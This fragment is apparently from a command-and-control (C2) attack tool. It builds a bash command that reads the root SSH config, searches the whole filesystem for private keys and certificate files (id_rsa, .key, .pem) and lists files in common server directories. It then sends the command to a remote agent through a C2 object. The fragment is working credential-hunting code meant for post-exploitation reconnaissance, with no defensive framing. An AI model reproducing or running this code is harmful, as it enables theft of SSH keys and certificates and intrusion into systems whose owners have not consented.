    cmd = RunBashCommand(agent, 
        'cat /root/.ssh/config 2>/dev/null || echo "No SSH config"; '
        'echo "==="; '
        'find / -name "*.key" -o -name "id_rsa*" -o -name "*.pem" 2>/dev/null | grep -v "/etc/ssl" | grep -v "/proc" | grep -v "/sys" | head -20; '
        'echo "==="; '
        'find /opt /srv /var /home /tmp /root -type f 2>/dev/null | grep -v "/proc" | head -30'
    )
    result = c2.send_command(cmd)
    return result
